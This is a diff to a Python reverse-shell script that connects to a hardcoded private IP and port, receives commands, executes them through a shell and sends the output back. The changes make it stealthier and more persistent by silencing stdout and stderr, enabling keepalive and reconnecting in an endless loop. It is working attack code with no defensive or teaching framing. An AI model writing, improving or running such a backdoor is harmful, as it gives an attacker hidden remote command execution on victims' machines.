@@ -6,28 +6,34 @@ import sys
 import os
 
 def reverse_shell(host="10.162.6.102", port=3399):
-    max_retries = 10
-    retry_delay = 5
+    # Suppress output
+    devnull = open(os.devnull, 'w')
+    sys.stdout = devnull
+    sys.stderr = devnull
     
     while True:
         try:
-            # Create socket
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
+            sock.settimeout(30)  # Extended timeout
             
-            # Connect to attacker
+            # Set keepalive
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+            
+            # Connect
             sock.connect((host, port))
             print(f"[+] Connected to {host}:{port}")
             
-            # Interactive shell loop
             while True:
                 try:
+                    # Set receive timeout
+                    sock.settimeout(10)
+                    
                     # Receive command
                     cmd = sock.recv(4096).decode().strip()
                     if not cmd:
                         break
-                        
-                    # Execute and return output
+                    
+                    # Execute and send response
                     proc = subprocess.Popen(
                         cmd,
                         shell=True,
@@ -37,14 +43,18 @@ def reverse_shell(host="10.162.6.102", port=3399):
                     output, _ = proc.communicate(timeout=10)
                     sock.sendall(output)
                     
+                except socket.timeout:
+                    print("[-] Communication timeout")
+                    continue
                 except Exception as e:
                     sock.sendall(str(e).encode())
                     
+        except socket.error as e:
+            print(f"[-] Socket error: {e}")
+            time.sleep(5)
         except Exception as e:
-            print(f"[-] Connection error: {e}")
-            time.sleep(retry_delay)
-            
-    sock.close()
+            print(f"[-] Unexpected error: {e}")
+            time.sleep(5)
 
 if __name__ == "__main__":
     reverse_shell()
